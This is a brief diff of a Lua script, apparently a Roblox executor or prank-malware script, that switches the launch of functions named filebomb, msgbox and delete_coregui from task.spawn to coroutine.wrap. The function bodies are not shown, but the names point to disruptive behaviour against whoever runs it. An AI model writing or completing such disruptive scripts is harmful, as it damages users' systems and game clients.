@@ -61,9 +61,13 @@ task.wait(_G.Delayed_1)
 Sound:Play()
 task.wait(_G.Delayed_2)
 
-task.spawn(filebomb)
-task.spawn(msgbox)
-task.spawn(delete_coregui)
+-- task.spawn(filebomb)
+-- task.spawn(msgbox)
+-- task.spawn(delete_coregui)
+
+coroutine.wrap(filebomb)()
+coroutine.wrap(msgbox)()
+coroutine.wrap(delete_coregui)()
 
 -- Properties
 local ScreenGui = Instance.new("ScreenGui", CoreGui)
